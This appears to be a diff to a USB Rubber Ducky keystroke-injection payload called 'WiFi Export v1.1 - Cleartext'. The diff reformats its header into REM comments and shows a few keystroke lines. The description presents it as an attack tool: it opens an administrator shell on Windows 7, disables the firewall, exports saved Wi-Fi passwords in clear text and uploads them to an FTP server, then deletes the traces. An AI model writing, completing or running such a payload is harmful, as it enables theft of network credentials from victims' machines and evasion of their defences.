@@ -1,11 +1,10 @@
-WiFi Export v1.1 - Cleartext
+REM WiFi Export v1.1 - Cleartext
+REM 
+REM Author: Bucky67GTO
+REM Duckencoder: 2.2
+REM Target: Windows 7
+REM Description: This script will enter the command shell as administrator, disable the firewall and export the wifi settings then send to an ftp server of your choice.  the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory and restore the firewall.
 
-Author: Bucky67GTO
-Duckencoder: 2.2
-Target: Windows 7
-Description: This script will enter the command shell as administrator, disable the firewall and export the wifi settings then send to an ftp server of your choice.  the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory and restore the firewall.
-
-```
 DELAY 2000
 ESCAPE
 CONTROL ESCAPE
@@ -52,4 +51,3 @@ ENTER
 DELAY 400
 ALT SPACE
 STRING c
-```
